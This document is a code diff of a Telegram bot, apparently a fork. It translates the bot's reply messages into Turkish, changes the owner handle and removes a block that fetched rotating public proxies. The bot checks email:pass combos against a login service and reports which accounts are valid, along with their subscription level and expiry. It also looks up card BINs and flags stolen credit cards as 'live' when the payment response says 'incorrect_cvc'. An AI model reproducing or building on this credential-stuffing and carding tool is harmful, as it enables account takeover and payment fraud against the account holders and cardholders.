@@ -19,19 +19,7 @@ logging.basicConfig(level=logging.INFO)
 # Initialize bot and dispatcher
 bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
 dp = Dispatcher(bot)
-
-###USE YOUR ROTATING PROXY### NEED HQ PROXIES ELSE WONT WORK UPDATE THIS FILED
-r = requests.get('http://pubproxy.com/api/proxy').text
-res = r.partition('\n')[0]
-proxy = {"http": f"http://{res}"}
-session = requests.session()
-
-
-
-
     )
-    
-
 @dp.message_handler(commands=['tv'], commands_prefix=PREFIX)
 async def tv(message: types.Message):
     tic = time.perf_counter()
@@ -42,7 +30,7 @@ async def tv(message: types.Message):
     password = splitter[1]
     if not ac:
         return await message.reply(
-            "<code>Send ac /tv email:pass.</code>"
+            "<code>Send ac /tb email:pass.</code>"
         )
     payload = {
         "username": email,
@@ -65,7 +53,7 @@ async def tv(message: types.Message):
     if "Access denied" in r.text:
         await message.reply(f"""
 <b>COMBO</b>➟ <code>{ac}</code>
-<b>STATUS</b>➟ ❌WRONG DETAILS
+<b>STATUS</b>➟ ❌hαtαlı Hєsαp
 TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
 """)
@@ -73,11 +61,11 @@ TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
         res = r.json()
         await message.reply(f"""
 <b>COMBO</b>➟ <code>{ac}</code>
-<b>STATUS</b>➟ ✅VALID
+<b>Durum</b>➟ ✅Doğru Hesap
 <b>LEVEL</b>➟ {res['details']['bearType']}
-<b>VALIDTILL</b>➟ {res['details']['fullVersionUntil']}
+<b>Bitiş Tarihi</b>➟ {res['details']['fullVersionUntil']}
 TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+<b>Kontrol Eden</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
 """)
     else:
         await message.reply("Error❌: REQ failed")
@@ -96,10 +84,10 @@ async def binio(message: types.Message):
     k = soup.find("div", {"class": "page"})
     INFO = f"""
 ═════════╕
-<b>BIN INFO</b>
+<b>Bin Bilgisi</b>
 <code>{k.get_text()[62:]}</code>
-CheckedBy: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-<b>Bot:</b> @BinnerRoBoT
+Kontrol Eden: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+<b>Bot Sahibi:</b> @Morkolive
 ╘═════════
 """
     await message.reply(INFO)
@@ -202,7 +190,7 @@ async def ch(message: types.Message):
     if "incorrect_cvc" in rx.text:
         await message.reply(f"""
 ✅<b>CC</b>➟ <code>{cc}</code>
-<b>STATUS</b>➟ #ApprovedCCN
+<b>STATUS</b>➟ #LiveKart
 <b>MSG</b>➟ {msg}
 <b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
